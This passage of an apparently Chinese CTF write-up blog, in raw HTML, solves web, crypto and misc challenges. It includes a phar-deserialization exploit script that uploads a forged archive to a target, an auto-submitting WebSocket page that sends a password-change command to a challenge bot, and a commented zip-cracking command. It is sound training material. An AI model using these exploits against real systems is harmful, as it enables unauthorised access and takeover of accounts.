class="variable">$c</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>




<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改phar文件以绕过throw触发destruct</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./phar1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f.replace(<span class="string">b&#x27;i:1;N&#x27;</span>,<span class="string">b&#x27;i:0;N&#x27;</span>) <span class="comment"># gc垃圾回收绕过throw</span></span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s+sha1(s).digest()+h <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">&#x27;phar2.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf) <span class="comment"># 写入新文件</span></span><br><span class="line">f.close()</span><br><span class="line">g.close()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;./phar2.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="comment">#打开文件</span></span><br><span class="line">file_out = gzip.<span class="built_in">open</span>(<span class="string">&quot;./phar.gz&quot;</span>, <span class="string">&quot;wb+&quot;</span>)<span class="comment">#创建压缩文件对象</span></span><br><span class="line"><span class="comment"># print(file_out)</span></span><br><span class="line">file_out.writelines(file)</span><br><span class="line">file_out.close()</span><br><span class="line">file.close()</span><br><span class="line">res=requests.post(</span><br><span class="line">    url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="comment"># 1: &#x27;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;&#125;&#x27;,</span></span><br><span class="line">        <span class="number">1</span>: <span class="string">&#x27;a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;&#125;i:0;N;&#125;&#x27;</span>,</span><br><span class="line">        <span class="number">0</span>: <span class="built_in">open</span>(<span class="string">&#x27;./phar.gz&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    &#125;,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">r = re.findall(<span class="string">&quot;tmp/(.*?).jpg&quot;</span>,res.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r[i])==<span class="number">32</span>:</span><br><span class="line">        r = r[i]</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file_get_contents触发phar反序列化</span></span><br><span class="line">res2 = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="number">1</span>: <span class="string">&#x27;a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;&#125;i:0;N;&#125;&#x27;</span>,</span><br><span class="line">        <span class="number">0</span>: <span class="string">f&#x27;phar://tmp/<span class="subst">&#123;r&#125;</span>.jpg&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res2.text)</span><br></pre></td></tr></table></figure>

<h2 id="CRYPTO-1"><a href="#CRYPTO-1" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"><span class="string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>yafu分解因式</p>
<p>然后直接脚本算</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class="line">q = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = m**e %(p*q)</span></span><br><span class="line"><span class="comment"># m = c**gmpy2.insert(e,(p-1)*(q-1)) % (p*q)</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"></span><br><span class="line">flag = binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>直接给了iv和key值，给flag赋值为c，iv和key直接赋值，直接使用：</p>
<blockquote>
<p>c &#x3D; my_aes.decrypt(flag)</p>
</blockquote>
<p>即可得出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()</span></span><br><span class="line">flag = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag += (16 - len(flag) % 16) * b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment"># c = my_aes.encrypt(flag)</span></span><br><span class="line">c = my_aes.decrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>




<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>还好，是几种常见解密方法</p>
<p>下载图片可以直接010打开，直接将压缩包格式的前面全部删掉并且保存为zip即可得到一个压缩包，或者稳妥点使用foremost分解出来，有加密，看了一下是真加密，于是找密码</p>
<p>想了想是png，就用Stegsolve打开，翻了一圈没找到，检查数据，使用的RGB最低位隐写</p>
<p>Password for zip<br>:Weak_Pas5w0rd</p>
<!-- ### decode
fcrackzip -D -p ./ruo.txt -u ./encode.zip -->


<h1 id="四叶草小活动"><a href="#四叶草小活动" class="headerlink" title="四叶草小活动"></a>四叶草小活动</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><p>base32解码，是压缩包文件的16进制格式，用脚本转一下存成压缩包</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> jinja2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime,long_to_bytes</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(<span class="number">0x504B03041400</span>)</span><br><span class="line"></span><br><span class="line">b = long_to_bytes(a)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(b)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
<p>打开有一个动图，随便截图，扫一下就出了</p>
<h1 id="强网杯2022"><a href="#强网杯2022" class="headerlink" title="强网杯2022"></a>强网杯2022</h1><h2 id="web-6"><a href="#web-6" class="headerlink" title="web"></a>web</h2><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><p>本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为<span class="exturl" data-url="aHR0cDovL2lwOnBvcnQv">http://ip:port/</span></p>
<p>docker run -dit -p “0.0.0.0:pub_port:8888” babyweb</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ws = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&quot;ws://47.93.187.169:42936/bot&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">sendtobot</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(url);</span><br><span class="line">            ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">                ws.<span class="title function_ invoke__">send</span>(<span class="string">&quot;changepw 2&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">                <span class="comment">//当ws(WebSocket)请求有响应信息时执行</span></span><br><span class="line">                <span class="comment">//注意：响应的信息可以通过evt.data获取！例如：</span></span><br><span class="line">                <span class="title function_ invoke__">alert</span>(evt.data);</span><br><span class="line">                ws.<span class="title function_ invoke__">close</span>();</span><br><span class="line">            &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;button id=<span class="string">&quot;fuck&quot;</span> type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;sendtobot()&quot;</span>&gt;发送&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;fuck&quot;</span>).<span class="title function_ invoke__">click</span>();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;欢迎来到强网杯照片墙&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;showfile.php?f=./demo.png&quot;</span>&gt;查看照片&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$upload</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload</span>, <span class="number">0333</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>])?!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]):<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;p class=&#x27;tip&#x27;&gt;guest can not upload file&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">session_id</span>().<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>])[<span class="number">0</span>].<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;tmp_name&quot;</span>],<span class="title function_ 